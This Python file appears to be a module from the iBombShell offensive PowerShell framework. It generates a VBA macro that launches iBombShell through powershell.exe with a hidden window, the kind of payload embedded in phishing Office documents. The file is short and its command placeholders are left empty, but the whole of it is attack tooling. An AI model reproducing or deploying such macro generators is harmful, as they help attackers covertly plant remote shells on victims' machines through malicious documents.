from termcolor import colored, cprint
from module import ModuleGenerate
from printib import print_ok, print_info, print_error
from base64 import b64encode

class CustomModule(ModuleGenerate):

    def __init__(self):
        information = {"Name": "Generate Macro iBombShell ",
                       "Description": "This module generates a macro to launch iBombShell",
                       "Author": "@josueencinar"}
        # Constructor of the parent class
        super(CustomModule, self).__init__(information)


    # This module must be always implemented, it is called by the run option
    def run_module(self):
        macro = """Sub launchIBombShell()
     Shell ("powershell.exe -noexit -W Hidden {}" & {})
End Sub
"""
        self.run(macro, "bas")